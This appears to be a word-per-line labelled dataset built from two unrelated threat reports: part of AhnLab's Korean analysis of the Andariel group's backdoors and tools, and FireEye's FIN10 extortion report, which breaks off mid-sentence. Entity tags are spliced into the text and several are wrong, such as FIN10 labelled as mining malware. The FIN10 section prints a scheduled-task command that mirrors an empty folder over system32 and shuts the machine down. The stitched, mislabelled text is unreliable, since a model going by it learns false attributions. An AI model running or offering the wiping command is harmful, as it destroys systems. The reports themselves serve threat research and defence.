경우도
있다
.

[
그림
15
]
Phandoor  B_malware.backdoor
의
특징적인
문자열
(
S^
)
Phandoor  B_malware.backdoor
가
실행되면
초기화를
거쳐
C&C
서버에
접속을
시도한

이때
'
Anonymous?  B_malware.ddos
'
를
보내
정상
서버
여부를
확인한다
.

[
그림
16
]
Anonymous B_malware.ddos
검사
코드

©
AhnLab
,
Inc
.
All
rights
reserved
.

16

Analysis
Report_Andariel
Threat
Group
이후
C&C
서버로부터
명령을
받아
cmd.exe를
실행하거나
그
외의
명령을
수행한다
.

0x10
0x12
0x19
0x1A
0x1B
드라이브
정보
파일
검색
인터넷에서
데이터
받아
파일
생성
일정
시간
후
메인
기능
재실행
nehomegpa.dll
파일
옮김
프로세스
리스트
얻기
프로세스
종료
권한
상승
[
표
4
]
Phandoor  B_malware.backdoor
주요
명령
1.5
)
Andaratm  B_malware.backdoor
Andaratm  B_malware.backdoor
악성코드는
2016년
군사
기관
공격
,
2017년
ATM
•
금융사
공격
,
2018년
가상
화폐
거래소
공격에
사용되었다
.

2016년
처음
발견된
이후
2018년
5월
현재까지
18개
변형이
확인되었다
.

Andaratm  B_malware.backdoor
악성코드에는
'
%s\cmd.exe
/c
echo
|
%s
>
%s
'
,
'
%s*****%s
'
등의
문자열이
존재한다
.

[
그림
17
]
Andaratm  B_malware.backdoor
악성코드의
특징적인
문자열
Andaratm  B_malware.backdoor
가
실행되면
컴퓨터
이름과
사용자
이름
등의
정보를
획득하며
,
지정된
C2
서버로
접속을
시도하고
명령을
받아
수행한다
.

한편
,
Andaratm  B_malware.backdoor
는
다른
악성코드와
유사한
암호화
방식을
사용한다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

17

Analysis
Report_Andariel
Threat
Group
[
그림
18
]
Andaratm  B_malware.backdoor
의
암호화
방식
Andaratm  B_malware.backdoor
는
파일
다운로드
,
업로드
,
cmd.exe
실행
등
간단한
명령만
실행한다
.

2
.
공격
도구
(
Tools
)
공격자는
통신을
위한
Putty
Link
,
포트
스캐너
등의
다양한
도구를
사용하고
있다
.

pcon.exe
,
portc.exe
,
zcon.exe
등의
파일
이름으로
IP와
포트를
확인하는
도구도
사용했다
.

Zcon.exe
변형은
[
그림
19
]
포트
스캐너
2015년
Bmdoor  B_malware.backdoor
에서도
사용했다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

18

Analysis
Report_Andariel
Threat
Group
[
그림
20
]
Zcon.exe
안다리엘
그룹은
Crash.exe
,
Test.exe
라는
이름의
악성코드를
제작했는데
,
이들
악성코드는
매년
8월
이후
하드디스크
내용을
파괴하는
기능을
갖고
있다
.

그러나
이들
악성코드가
실제
공격에
사용되었는지는
확인되지
않았다
.

다수
공격
사례의
연관성
안다리엘
그룹은
다양한
악성코드를
사용하여
다수의
공격을
전개했는데
,
코드의
유사성
외에도
이들
다수의
공격
사이에는
연관성을
짐작할
수
있는
요소가
있다
.

안랩의
상세
분석
결과
,
안다리엘
그룹과
오퍼레이션
블랙
마인의
공격
방식
등이
비슷하며
,
특히
zcon.exe
파일을
공통적으로
사용했음이
확인되었다
.

이로써
오퍼레이션
블랙
마인은
안다리엘
그룹과
연관되었다고
추정할
수
있다
.

유사한
악성코드로
다양한
목표를
공격했으며
,
일부
악성코드는
동일한
C2를
사용했다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

19

Analysis
Report_Andariel
Threat
Group
[
그림
21
]
안다리엘
그룹과
다수의
공격
사이의
연관
관계
매크로를
이용한
공격의
경우에도
2015년과
2017년의
매크로
코드에
큰
차이가
없다
.
[
그림
22
]
2015년
(
좌
)
과
2017년
(
우
)
매크로
코드
비교

©
AhnLab
,
Inc
.
All
rights
reserved
.

20

Analysis
Report_Andariel
Threat
Group
또한
안다리엘
그룹에서
제작한
악성코드는
유사한
암호화
방식을
사용하고
있다
.

[
그림
23
]
안다리엘
그룹
악성코드의
암호화
방식
안랩
제품의
대응
현황
안랩
V3
제품군에서는
안다리엘
그룹과
관련된
악성코드를
다음과
같은
진단명으로
탐지하고
있다
.

<
V3
제품군
진단명
>
-
Trojan/Win32.Phandoor  B_malware.backdoor
(
2016.01.13.00
)
-
Trojan/Win32.Andaratm
(
2018.05.03.00
)
-
W97M/Downloader
(
2017.11.03.00
)
-
Backdoor/Win32.Aryan
(
2015.12.23.00
)
-
Dropper/Win32.Fakeinstaller
(
2017.01.02.09
)
-
Trojan/Win32.HackTool
(
2017.06.27.03
)
-
Trojan/Win32.Andarat
(
2017.10.27.03
)
-
HackTool/Win32.Malsender
(
2017.04.17.04
)
-
Trojan/Win32.Rifdoor B_malware.backdoor
(
2015.12.23.04
)
-
X97M/Downloader
(
2015.12.24.05
)

©
AhnLab
,
Inc
.
All
rights
reserved
.

21

Analysis
Report_Andariel
Threat
Group
결론
안다리엘
그룹은
한국에서
활동하고
있는
위협
그룹
중
가장
왕성히
활동하고
있는
그룹이다
.

초반에는
주로
군사와
관련된
정보를
획득하기
위해
공격을
전개했지만
2016년
말부터
금전적
이득을
위해서도
공격을
진행하고
있어
각별한
주의가
필요하다
.

또한
공격
대상
(
target
)
이
사용하는
소프트웨어의
취약점을
이용한
공격이
빈번한
점
등으로
미루어
한국의
IT
환경에
대해
상당히
파악하고
있는
것으로
보인다
.

안다리엘
그룹의
공격
사례에서
확인한
것처럼
기업
및
기관의
중앙관리
솔루션
또한
언제든
공격의
경로가
될
수
있다
.

중앙관리
솔루션을
이용한
공격은
조직
전반에
걸쳐
막대한
피해를
야기할
수
있어
더욱
각별한
보안
관리가
요구된다
.

특히
중앙관리
솔루션의
관리
서버에
대한
보안
정책이
중요하다
.

정해진
시스템에서만
관리
서버
접근이
가능하도록
제한하는
것은
물론
,
관리
서버의
로그인
정보
(
관리자
계정
)
를
자주
변경하고
시스템에
저장하지
않는
등의
기본적인
보안
정책이
지켜질
수
있도록
적절한
관리가
필요하다
.

또한
주기적인
로그
확인을
통해
비정상적인
파일이
관리
서버를
통해
배포되지
않았는지
확인해야
한다
.

또한
관리
서버를
통하지
않고
클라이언트에
설치된
에이전트
취약점을
이용하는
공격
사례도
있어
중앙관리
솔루션이
사용하는
포트
번호에
대한
스캐닝
등이
발생하지
않는지
모니터링이
필요하다
.

공격자는
다양한
방법으로
기업과
기관의
내부로
침투를
시도하고
있다
.

대부분
외부와의
접점에
대한
보안에
집중하기
쉬우나
중앙관리
솔루션
이용
공격과
같이
내부
인프라에서
발생하는
이벤트에
대한
모니터링
또한
간과해서는
안된다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

22

Analysis
Report_Andariel
Threat
Group
참고자료
[
1
]
안랩
,
'
검은
광산
작전
'
의
비밀을
캐내다
'
http://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?curPage=&menu_dist=1&seq=24229
[
2
]
지속적인
방위산업체
공격
시도
,
왜
?
http://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?menu_dist=2&seq=26565
[
3
]
금융보안원
인텔리전스보고서_국내를
타깃으로
하는
위협그룹
프로파일링
http://www.fsec.or.kr/user/bbs/fsec/21/13/bbsDataView/910.do
[
4
]
표적형
공격
?
중앙관리
소프트웨어를
수비하라
http://image.ahnlab.com/file_upload/asecissue_files/ASEC_REPORT_vol.89.pdf
[
5
]
유명
기업
보안
시스템을
연달아
뚫다
,
대범한
해킹조직의
공격
-1편
http://blog.skinfosec.com/221234553836
[
6
]
유명
기업
보안
시스템을
연달아
뚫다
,
대범한
해킹조직의
공격
-
2편http://blog.skinfosec.com/221234742268
[
7
]
하나투어
개인정보유출...수탁업체서
시작
https://blog.naver.com/secustory/221213258234

©
AhnLab
,
Inc
.
All
rights
reserved
.

23
100
=
$
124,000

AS
OF
MID-APRIL
2017

BITCOIN
RANSOM
DEMAND

FireEye
iSIGHT
Intelligence

FIN10 B_malware.mining

Anatomy
of
a
Cyber
Extortion
Operation

PRIMARY
GOAL
TO
STEAL
:

BUSINESS
DATA
,
FILES
,
RECORDS
,
CORRESPONDENCE
AND
CUSTOMER
PII

100-500

REQUESTED
RANSOMS
RANGED
FROM
100
TO
500
BITCOINS

TARGETING
CASINOS
AND
MINING
ORGANIZATIONS
IN
NORTH
AMERICA
,
WITH
A
FOCUS
ON
CANADA

SPECIAL
REPORT

2

CONTENTS

Introduction

Background

Targeting

FIN10 B_malware.mining
Tactics
,
Techniques
and
Procedures

Initial
Compromise

Early
Stage
Malware

Lateral
Movement
&
Internal
Reconnaissance

System
Disruption

End-Stage
Operations

Outlook

Lessons
learned
from
investigating
FIN10 B_malware.mining
and
other
disruptive
breaches

Conclusion

Appendix
-
Sample
Extortion
Email

3

4

6

6

7

7

8

8

9

10

12

14

15

SPECIAL
REPORT

FIN10 B_malware.mining
:
ANATOMY
OF
A
CYBER
EXTORTION
OPERATION

3

INTRODUCTION

FireEye
has
identified
a
set
of
financially
motivated
intrusion
operations
being
carried
out
by
an
actor
we
have
dubbed
FIN10 B_malware.mining
.

Within
these
clusters
of
activity
,
the
attacker
(
s
)
have
compromised
organizations
'
networks
and
sought
to
monetize
this
illicit
access
by
exfiltrating
sensitive
data
and
extorting
victim
organizations
.

We
have
observed
FIN10 B_malware.mining
targeting
organizations
in
North
America
,
predominately
in
Canada
.

FIN10 B_malware.mining
primarily
relies
on
publicly-available
software
,
scripts
and
techniques
to
gain
a
foothold
into
victims
'
networks
.

The
threat
group
then
posts
proof
of
the
stolen
data
on
publicly
accessible
websites
.

Failure
to
pay
the
threat
group
could
result
in
the
public
release
of
stolen
data
and
potential
disruption
or
destruction
of
the
victim
's
information
assets
and
systems
.

In
this
report
,
we
describe
FIN10 B_malware.mining
's
activities
and
tactics
,
techniques
and
procedures
(
TTPs
)
,
and
provide
a
glimpse
into
how
they
execute
their
operations
.

4

SPECIAL
REPORT

TARGETING
CASINOS
AND
MINING
ORGANIZATIONS
IN
NORTH
AMERICA
,
WITH
A
FOCUS
ON
CANADA

Background

FIN10 B_malware.mining
:
ANATOMY
OF
A
CYBER
EXTORTION
OPERATION

5

100
=
$
124,000

AS
OF
MID-APRIL
2017

BITCOIN
RANSOM
DEMAND

Fireeye
has
observed
multiple
targeted
intrusions
occurring
in
North
America
—
predominately
in
Canada
—
dating
back
to
at
least
2013
and
continuing
through
at
least
2016
,
in
which
the
attacker
(
s
)
have
compromised
organizations
'
networks
and
sought
to
monetize
this
illicit
access
by
exfiltrating
sensitive
data
and
extorting
victim
organizations
.

In
some
cases
,
when
the
extortion
demand
was
not
met
,
the
attacker
(
s
)
destroyed
production
Windows
systems
by
deleting
critical
operating
system
files
and
then
shutting
down
the
impacted
systems
.

Based
on
near
parallel
TTPs
used
by
the
attacker
(
s
)
across
these
targeted
intrusions
,
we
believe
these
clusters
of
activity
are
linked
to
a
single
,
previously
unobserved
actor
or
group
that
we
have
dubbed
FIN10 B_malware.mining
.

6

SPECIAL
REPORT

Targeting

Beginning
as
early
as
2013
and
continuing
through
at
least
2016
,
we
have
observed
FIN10 B_malware.mining
target
organizations
based
in
North
America
–
predominately
in
Canada
.

Targeted
organizations
have
primarily
been
casinos
and
mining
organizations
.

Figure
1
.

TTPs
as
organized
by
targeted
attack
lifecycle
model

FIN10 B_malware.mining
Tactics
,
Techniques
and
Procedures

The
following
sections
correspond
to
the
attackers
'
TTPs
and
are
organized
by
the
stages
of
the
targeted
attack
lifecycle
(
See
Figure
1
)
.

MAINTAIN
PRESENCE
/
MOVE
LATERALLY

•
Compromised
credentials
/
VPN

•
RDP

•
Meterpreter

•
PowerShell
Empire

•
SplinterRAT

INITIAL
COMPROMISE

ESTABLISH
FOOTHOLD

INTERNAL
RECONNAISSANCE

COMPLETE
MISSION

•
Likely
Spear
Phishing
Emails

•
Meterpreter
function
of
Metasploit

•
PowerShell
Empire

•
SplinterRAT

•
PowerShell
Empire

•
Meterpreter

•
SplinterRAT

•
Extortion
via
False
Flag

•
Data
Exposure

•
Destructive
Batch
Scripts

FIN10 B_malware.mining
:
ANATOMY
OF
A
CYBER
EXTORTION
OPERATION

7

Initial
Compromise

In
the
majority
of
intrusions
attributed
to
FIN10 B_malware.mining
,
there
was
insufficient
evidence
to
determine
the
initial
infection
vector
.

However
,
in
at
least
two
intrusions
,
FIN10 B_malware.mining
leveraged
spear
phishing
emails
with
malicious
attachments
,
making
it
plausible
that
this
methodology
was
used
across
all
breaches
.

•
In
both
instances
where
the
initial
compromise
was
identified
,
the
attacker
(
s
)
used
social
engineering
and
specifically
crafted
lures
to
entice
victims
to
click
on
a
link
that
directed
them
to
a
FIN10-controlled
server
.

The
server
hosted
malicious
artifacts
that
ultimately
executed
code
on
one
or
more
systems
.

In
these
instances
,
the
malicious
code
were
downloaders
that
beaconed
out
to
attacker-controlled
infrastructure
.

•
In
one
intrusion
,
the
phishing
email
referenced
an
updated
holiday
schedule
for
organizational
staff
.

The
embedded
URL
pointed
to
a
malicious
HTML
Application
(
HTA
)
file
.

•
In
another
intrusion
,
a
phishing
email
referenced
an
employee
questionnaire
.

The
embedded
URL
pointed
to
a
Word
Open
XML
Macro-Enabled
Document
file
(
DOCM
)
file
.

•
Of
note
,
FIN10 B_malware.mining
likely
uses
LinkedIn
—
among
other
social
media
and
public
data
sources
—
to
support
the
crafting
of
phishing
emails
that
appear
legitimate
.

Early
Stage
Malware

The
attacker
(
s
)
primarily
relied
on
publicly-available
software
,
scripts
and
techniques
to
gain
a
foothold
into
victims
'
networks
.

Meterpreter

FIN10 B_malware.mining
used
Meterpreter
as
the
primary
method
of
establishing
an
initial
foothold
within
victim
environments
.

However
,
in
one
case
,
we
also
observed
the
group
use
Splinter
Remote
Access
Trojan
(
SplinterRAT
)
.

Meterpreter
,
short
for
the
Meta-Interpreter
,
is
an
advanced
payload
included
in
the
Metasploit
Framework
.

It
provides
functionality
that
would
otherwise
be
difficult
to
implement
in
assembly
by
allowing
developers
to
write
their
own
extensions
in
the
form
of
DLL
files
that
can
be
uploaded
and
injected
post
exploitation
.

Meterpreter
and
most
of
its
extensions
are
executed
in
memory
,
thus
largely
evading
detection
by
standard
anti-virus
.

Due
to
its
public
availability
,
FireEye
iSIGHT
Intelligence
has
observed
multiple
threat
actor
groups
use
Meterpreter
in
targeted
attacks
across
various
industries
.

PowerShell

Threat
actors
often
use
PowerShell
to
write
their
own
malicious
utilities
,
which
typically
decrease
chance
of
detection
by
popular
endpoint
security
controls
.

When
scripts
are
executed
with
PowerShell
,
the
scripts
run
inside
powershell.exe
(
locally
)
or
wsmprovhasost.exe
(
remotely
)
,
both
of
which
are
often
trusted
processes
.

PowerShell
provides
threat
actors
with
the
ability
to
create
scripts
that
exceed
the
capabilities
of
a
standard
Windows
shell
,
batch
files
and
VBS
files
.

In
the
majority
of
cases
,
we
observed
FIN10 B_malware.mining
leveraging
PowerShell
Empire
(
a
pen-testing
tool
that
utilizes
PowerShell
)
for
elevated
persistence
,
mainly
by
utilizing
the
Registry
and
Scheduled
Task
options
;
however
,
in
at
least
one
intrusion
,
we
observed
FIN10 B_malware.mining
use
S4U
tasks
for
this
purpose
,
although
this
method
was
likely
abandoned
in
favor
of
PowerShell
Empire
once
it
was
released
.

In
at
least
one
instance
,
PowerShell
Empire
was
used
to
install
a
randomly
named
service
that
executed
a
Meterpreter
PowerShell
script
,
which
in
turn
executed
malicious
.bat
files
.

The
created
batch
scripts
typically
contained
PowerShell
commands
for
32-bit
and
64-bit
operating
systems
and
upon
execution
could
connect
to
an
attacker
command
and
control
(
C2
)
server
.

We
have
also
observed
FIN10 B_malware.mining
using
PowerShell
to
load
Metasploit
Meterpreter
stagers
into
memory
.

8

Lateral
Movement
and
Internal
Reconnaissance

FIN10 B_malware.mining
routinely
leverages
Windows
Remote
Desktop
Protocol
(
RDP
)
to
access
systems
within
the
environment
.

More
specifically
,
attacker
(
s
)
leveraged
RDP
to
authenticate
to
internal
systems
that
were
configured
to
allow
ingress
RDP
connections
from
systems
residing
outside
organizational
firewall
perimeters
.

Similarly
,
we
have
observed
FIN10 B_malware.mining
,
in
at
least
two
instances
,
use
single-factor
protected
VPN
to
connect
remotely
to
victim
networks
after
stealing
credentials
.

In
multiple
events
,
FIN10 B_malware.mining
also
leveraged
functionality
within
the
PowerShell
script
Meterpreter
backdoor
to
perform
internal
reconnaissance
and
move
laterally
throughout
the
environment
.

Further
analysis
found
the
attacker
(
s
)
used
Meterpreter
functionality
to
enumerate
users
on
remote
systems
and
execute
additional
PowerShell
functionality
.

In
at
least
one
network
compromise
,
attacker
(
s
)
moved
laterally
using
the
Local
Administrator
account
and
deployed
Metasploit
Meterpreter
stagers
and
SplinterRAT
instances
on
targeted
systems
.

SplinterRAT
is
an
open-source
red
team
collaboration
framework
.

It
is
a
Java-based
framework
that
was
publicly
available
and
relatively
easy
to
implement
with
limited
knowledge
.

In
addition
,
SplinterRAT
provides
capabilities
such
as
file
system
browsing
,
file
upload
and
download
,
execution
of
shell
commands
and
beaconing
in
case
of
communication
issues
with
a
C2
server
.

Both
the
Metasploit
related
backdoors
and
SplinterRAT
instances
were
programmed
to
connect
to
attacker-controlled
C2
servers
.

We
have
regularly
observed
FIN10 B_malware.mining
use
scheduled
tasks
as
a
persistence
mechanism
.

For
example
,
in
at
least
one
intrusion
we
observed
FIN10 B_malware.mining
create
a
scheduled
task
named
'C
:
\Windows\System32\Tasks\Updater
'
,
which
executed
a
PowerShell
script
encoded
in
the
Windows
registry
.

The
script
was
configured
to
communicate
with
attacker-controlled
C2
infrastructure
.

System
Disruption

FIN10 B_malware.mining
routinely
deploys
destructive
batch
scripts
intended
to
delete
critical
system
files
and
shutdown
network
systems
.

Network
degradation
activity
typically
consisted
of
the
attacker
(
s
)
creating
scheduled
tasks
on
multiple
systems
within
the
targeted
network
environment
to
disrupt
the
normal
operations
of
those
systems
by
rendering
their
operating
systems
unusable
.

In
at
least
two
instances
,
FIN10 B_malware.mining
created
a
scheduled
task
that
used
the
command
shown
in
Figure
2
to
delete
the
Windows
directory
using
the
Microsoft
robocopy
tool
on
critical
systems
within
the
environment
.

Figure
2
.

Example
of
scheduled
task
created
to
disrupt
normal
operations

robocopy
'C
:
\emptydir
'
'C
:
\windows\system32'/MIR
|
shutdown
/s
/t
1800
mkdir
'C
:
\emptydir
'

While
this
TTP
could
potentially
be
viewed
as
an
attempt
by
FIN10 B_malware.mining
to
obfuscate
malicious
activity
,
the
resulting
effects
of
these
scheduled
tasks
were
easily
detected
,
suggesting
that
these
activities
were
intended
to
lend
credence
to
the
perceived
threat
.

SPECIAL
REPORT

9

End-Stage
Operations

We
believe
the
primary
goal
of
this
threat
group
is
to
steal
corporate
business
data
,
files
,
records
,
correspondence
and
customer
PII
,
and
then
to
extort
victim
organizations
for
non-release
of
the
stolen
data
.

The
threat
group
posts
proof
of
the
stolen
data
on
publicly
accessible
websites
.

Failure
to
pay
the
threat
group
could
result
in
the
public
release
of
stolen
data
and
potential
disruption
or
destruction
of
the
victim
's
information
assets
and
systems
.

Extortion

In
all
but
one
targeted
intrusion
we
have
attributed
to
FIN10 B_malware.mining
,
the
attacker
(
s
)
demanded
a
variable
sum
payable
in
Bitcoin
for
the
non-release
of
sensitive
data
obtained
during
network
reconnaissance
stages
(
See
Appendix
for
sample
extortion
email
)
.

•
Requested
sums
ranged
from
100
to
500
Bitcoins
(
roughly
$
124,000
to
$
620,000
as
of
mid-April
2017
)
.

•
Notably
,
we
identified
at
least
two
victims
who
were
issued
the
same
Bitcoin
address
.

•
In
the
first
incident
Mandiant
investigated
that
was
attributed
to
FIN10 B_malware.mining
,
the
attacker
(
s
)
did
not
extort
the
targeted
organization
.

However
,
it
is
plausible
that
the
group
was
still
in
the
process
of
honing
its
TTPs
.

Data
Exposure

FIN10 B_malware.mining
likely
uses
a
combination
of
copy
tools
and
file
transfer
utilities
to
both
harvest
and
stage
sensitive
data
.

Data
exposure
is
accomplished
routinely
using
openly-accessible
websites
such
as
'pastebin.com
,
'
'justpaste.it
,
'
and
'thepiratebay.se
.
'

We
have
also
observed
the
group
using
popular
cloud
file
sharing/
storage
solutions
,
such
as
Dropbox
,
to
receive
stolen
data
in
extortion
attempts

Links
to
the
leaked
data
are
initially
kept
private
and
provided
solely
to
the
victim
organization
as
proof
of
the
authenticity
of
the
compromise
.

We
have
seen
FIN10 B_malware.mining
heavily
leverage
the
'justpaste.it
'
service
for
these
purposes
.

Narrative
&
Messaging

Attacker
(
s
)
in
all
instances
utilized
a
false
flag
—
a
term
used
to
describe
covert
operations
that
are
designed
to
deceive
in
such
a
way
that
activities
appear
as
though
they
are
being
carried
out
by
entities
,
groups
or
nations
other
than
those
who
actually
planned
and
executed
them
.

•
Based
on
open-source
reporting
,
the
attacker
(
s
)
in
at
least
one
intrusion
self-identified
as
the
'Angels_Of_Truth
,
'
and
claimed
the
attacks
on
the
victim
were
in
reciprocity
for
Canada-imposed
economic
sanctions
on
Russia
.

The
quality
of
the
Russian-language
posts
,
however
,
was
considerably
poor
and
very
similar
to
output
obtained
from
online
translating
solutions
,
making
it
likely
the
attacker
(
s
)
are
not
native
Russian
speakers
and
were
using
this
narrative
to
mislead
attribution
attempts
.

•
The
attacker
(
s
)
more
commonly
used
a
moniker
associated
with
a
Serbian
hacktivist
group
dubbed
'Tesla
Team
.
'

Given
the
vast
differences
in
external
targeting
calculus
—
targeted
industry
verticals
by
FIN10 B_malware.mining
as
compared
to
political
organizations
,
nongovernmental
organizations
and
websites
of
anti-Serb
organizations
targeted
by
Tesla
Team
—
and
inconsistencies
in
tradecraft
,
we
doubt
that
the
Serbian
hacktivist
group
Tesla
Team
(
previously
active
in
2013
)
is
associated
with
FIN10 B_malware.mining
.

–
In
at
least
one
intrusion
,
we
observed
the
group
abandon
the
moniker
Tesla
Team
in
the
group
's
last
correspondence
to
the
targeted
victim
and
adopt
the
moniker
'Anonymous
Threat
Agent
.
'

•
Emphasis
in
regional
targeting
of
North
American-based
organizations
could
possibly
suggest
the
attacker
(
s
)
familiarity
with
the
region
.

FIN10 B_malware.mining
also
seeks
to
increase
its
leverage
by
sending
multiple
emails
to
staff
and
board
members
of
the
victim
organizations
,
notifying
them
of
the
breach
and
potential
consequences
for
nonpayment
.

FIN10 B_malware.mining
also
informs
open-source
blogs
about
breaches
in
a
likely
effort
to
publicly
expose
these
breaches
and
apply
additional
pressure
on
affected
organizations
to
acquiesce
to
extortion
demands
.

Alternatively
,
it
is
just
as
plausible
FIN10 B_malware.mining
does
this
to
simply
maximize
exposure
for
victims
who
do
not
pay
.

Notably
,
we
have
also
observed
the
group
engage
local
journalists
to
publicize
these
breaches
.

FIN10 B_malware.mining
:
ANATOMY
OF
A
CYBER
EXTORTION
OPERATION

10

SPECIAL
REPORT

Outlook

100-500

REQUESTED
RANSOMS
RANGED
FROM
100
TO
500
BITCOINS

500
=
$
620,000

DEMAND

BITCOIN
RANSOM

AS
OF
MID-APRIL
2017

FIN10 B_malware.mining
:
ANATOMY
OF
A
CYBER
EXTORTION
OPERATION

11

The
relative
degree
of
operational
success
enjoyed
by
FIN10 B_malware.mining
makes
it
highly
probable
the
group
will
continue
to
conduct
similar
extortion-based
campaigns
at
least
in
the
near
term
.

Notably
,
we
already
have
some
evidence
to
suggest
FIN10 B_malware.mining
has
targeted
additional
victims
beyond
currently
confirmed
targets
.

Furthermore
,
while
FIN10 B_malware.mining
is
predominantly
financially
motivated
,
as
evidenced
by
its
preferred
monetization
technique
(
i.e.
,
extortion
)
,
it
is
plausible
the
group
is
also
motivated
,
at
least
in
part
,
by
ego
.

For
instance
,
the
group
's
willingness
to
contact
cyber
security
bloggers
is
likely
the
result
of
at
least
two
motivational
factors
:

1

2

To
further
the
groups
operational
objectives
,
likely
by
putting
increased
pressure
on
targeted
victims
to
acquiesce
to
now
public
extortion
demands

To
gain
some
degree
of
notoriety
and
public
exposure
of
the
group
's
campaigns

While
the
secondary
motivation
may
be
a
necessary
byproduct
of
the
first
,
more
primary
objective
,
desire
to
gain
notoriety
could
potentially
influence
the
group
's
decision-making
calculus
.

Lastly
,
while
FIN10 B_malware.mining
has
seemingly
only
targeted
organizations
within
two
industry
verticals
,
it
is
possible
the
group
has
previously
or
will
in
the
future
expand
their
regional
and
industry-specific
targeting
.

Historically
,
we
have
seen
this
type
of
threat
activity
—
cyber
attacks
resulting
in
the
theft
or
compromise
of
sensitive
data
to
be
leveraged
in
extortion
plots
—
affect
multiple
targeted
verticals
.

12

SPECIAL
REPORT

Lessons
Learned

from
investigating
FIN10 B_malware.mining
and
other
disruptive
breaches

Responding
to
disruptive
breaches
such
as
FIN10 B_malware.mining
is
challenging
and
not
easy
to
plan
for
given
the
dynamic
nature
of
these
attacks
and
the
attacker
(
s
)
.

Unlike
breaches
where
a
containment
plan
may
be
able
to
stop
an
attacker
from
stealing
more
information
,
in
these
disruptive
instances
the
damage
may
have
already
been
done
by
the
time
the
attacker
(
s
)
contacts
the
victim
organization
.

Therefore
,
a
different
response
to
these
incidents
might
be
required
.

The
following
ten
lessons
from
our
incident
response
engagements
may
help
organizations
deal
with
disruptive
attacks
,
including
those
from
groups
such
as
FIN10 B_malware.mining
:

1

CONFIRM
THERE
IS
A
BREACH

2

REMEMBER
THAT
YOU
'RE
DEALING
WITH
A
HUMAN
ADVERSARY

3

TIMING
IS
CRITICAL

4

STAY
FOCUSED

Just
because
someone
claimed
they
hacked
you
does
n't
necessarily
make
it
true
.

Empty
extortion
attempts
are
not
uncommon
.

Examine
your
environment
for
evidence
of
compromise
before
considering
to
pay
the
ransom
.

Usually
FIN10 B_malware.mining
provides
data
as
proof
(
see
the
'Data
Exposure
'
section
)
,
so
confirm
that
the
data
is
real
and
determine
if
it
came
from
your
environment
.

Humans
can
be
unpredictable
and
they
may
react
out
of
emotion
.

Carefully
consider
how
an
attacker
will
react
to
your
action
or
inaction
.

They
can
become
more
aggressive
if
they
get
upset
.

They
may
back
down
and
allow
for
more
time
if
they
believe
you
are
trying
to
meet
their
demands
.

You
need
to
validate
and
scope
the
breach
as
quickly
as
possible
.

This
may
require
the
team
working
nights
and
weekends
,
so
be
careful
of
fatigue
and
burnout
.

You
may
need
to
approve
emergency
change
requests
within
short
order
.

It
's
easy
to
get
distracted
.

Evaluate
whether
the
tasks
you
are
taking
on
will
help
mitigate
,
detect
,
respond
to
or
contain
the
attack
.

Remember
that
you
're
racing
against
the
clock
.

Focus
on
the
must-haves
instead
of
the
nice-to-haves
and
understand
that
you
may
need
to
deploy
a
number
of
temporary
solutions
to
address
the
attack
.

5

CAREFULLY
EVALUATE
WHETHER
TO
ENGAGE
WITH
THE
ATTACKER
(
S
)

Attackers
do
not
always
expect
a
response
.

If
you
decide
to
respond
,
limit
the
interactions
and
carefully
consider
everything
you
say
.

Consider
involving
law
enforcement
and
legal
counsel
in
all
communications
.

FIN10 B_malware.mining
:
ANATOMY
OF
A
CYBER
EXTORTION
OPERATION

13

PRIMARY
GOAL
TO
STEAL
:

BUSINESS
DATA
,
FILES
,
RECORDS
,
CORRESPONDENCE
AND
CUSTOMER
PII

6

ENGAGE
THE
EXPERTS
BEFORE
A
BREACH

7

8

9

10

CONSIDER
ALL
OPTIONS
WHEN
ASKED
TO
PAY
A
RANSOM

ENSURE
STRONG
SEGMENTATION
AND
CONTROLS
OVER
YOUR
BACKUPS

AFTER
THE
INCIDENT
HAS
BEEN
HANDLED
,
IMMEDIATELY
FOCUS
ON
BROADER
SECURITY
IMPROVEMENTS

IF
YOU
KICK
THEM
OUT
,
THEY
MAY
TRY
TO
COME
BACK
IN
A
DIFFERENT
WAY

You
will
need
forensic
,
legal
and
public
relations
support
to
get
through
a
disruptive
breach
.

Identify
partners
before
the
breach
and
get
them
on
retainer
.

Understand
that
paying
the
ransom
may
be
the
right
option
,
but
there
are
no
guarantees
the
attacker
(
s
)
won't
come
back
for
more
money
or
simply
leak
the
data
anyway
.

Include
experts
in
the
decision-making
process
and
understand
the
risks
associated
with
all
options
.

Most
organizations
have
mature
backup
policies
so
they
can
recover
quickly
in
the
event
of
a
system
failure
.

However
,
it
's
common
for
the
systems
containing
backups
to
be
part
of
the
same
environment
compromised
by
the
attacker
.

Tighten
access
to
your
backup
environment
to
mitigate
the
risk
of
an
attacker
accessing
the
system
using
compromised
credentials
and
destroying
your
backups
.

Regardless
of
the
outcome
,
you
should
ensure
that
attackers
such
as
FIN10 B_malware.mining
can
not
come
back
in
and
do
more
damage
.

You
also
do
n't
want
a
second
attacker
targeting
you
because
they
think
you
are
willing
to
pay
a
ransom
.

Ensure
you
understand
the
full
extent
of
the
breach
and
implement
both
tactical
and
strategic
actions
to
prevent
future
attackers
from
gaining
access
.

Don't
forget
to
operationalize
and
enhance
the
temporary
solutions
that
were
deployed
to
immediately
address
the
attack
.

Conduct
penetration
testing
and
Red
Team
assessments
to
validate
your
security
controls
,
identify
vulnerabilities
and
fix
them
immediately
.

14

SPECIAL
REPORT

Conclusion

Although
FireEye
has
observed
FIN10 B_malware.mining
primarily
targeting
casinos
and
mining
organizations
in
North
America
(
with
a
focus
on
Canada
)
,
all
organizations
from
around
the
world
must
be
prepared
to
detect
and
respond
to
threats
from
this
group
and
other
bad
actors
.

We
believe
the
primary
goal
of
FIN10 B_malware.mining
is
to
steal
corporate
business
data
,
files
,
records
,
correspondence
and
customer
PII
for
the
purposes
of
extorting
victim
organizations
for
the
non-release
of
the
stolen
data
.

Enterprises
that
are
contacted
by
a
group
claiming
to
have
their
data
will
want
to
carefully
assess
if
an
incident
has
actually
occurred
.

In
the
case
of
FIN10 B_malware.mining
,
we
have
observed
them
posting
proof
of
the
stolen
data
on
publicly
accessible
websites
.

When
dealing
with
these
types
of
extortion-based
attacks
,
we
strongly
recommend
that
organizations
work
quickly
,
stay
focused
,
consider
all
options
and
potentially
involve
forensic
,
legal
,
law
enforcement
and
public
relations
experts
before
taking
any
actions
or
communicating
with
